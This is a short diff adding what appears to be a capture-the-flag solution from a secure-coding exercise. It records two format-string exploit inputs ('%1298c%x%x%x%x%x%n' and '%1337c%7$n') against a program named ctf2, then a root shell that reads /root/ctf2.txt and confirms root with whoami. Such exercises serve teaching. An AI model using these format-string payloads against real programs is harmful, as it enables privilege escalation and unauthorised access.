@@ -1,0 +1,7 @@
+V1: attacker@secure-coding:~$ ctf2 %1298c%x%x%x%x%x%n
+V2: attacker@secure-coding:~$ ctf2 %1337c%7\$n
+
+# cat /root/ctf2.txt
+This is the second flag. It is not difficult to exploit format strings, isn't it?
+# whoami
+root
